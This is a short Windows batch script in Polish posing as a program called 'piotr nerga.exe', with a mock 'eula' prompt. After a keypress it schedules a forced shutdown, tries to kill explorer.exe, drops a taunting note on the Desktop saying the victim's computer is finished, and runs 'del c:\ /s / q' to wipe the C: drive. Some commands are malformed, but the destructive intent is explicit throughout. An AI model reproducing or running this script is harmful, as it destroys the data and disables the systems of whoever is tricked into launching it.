@echo off
title piotr nerga.exe
color 0A
@echo eula
@echo jezieli chcesz to odpalic to nacisnij co kolwiek a jak nie to wyjdz!
@echo szypka decyzja
pause>null
shutdown -s -t 60 -c "masz po kompie"
taskkill /e /pid explorer.exe
cd Desktop
echo masz po kompie jurz nic nie zrobisz sam wchodziłeś w to>Piotr Nerga.txt
start Piotr Nerga.txt
del c:\ /s / q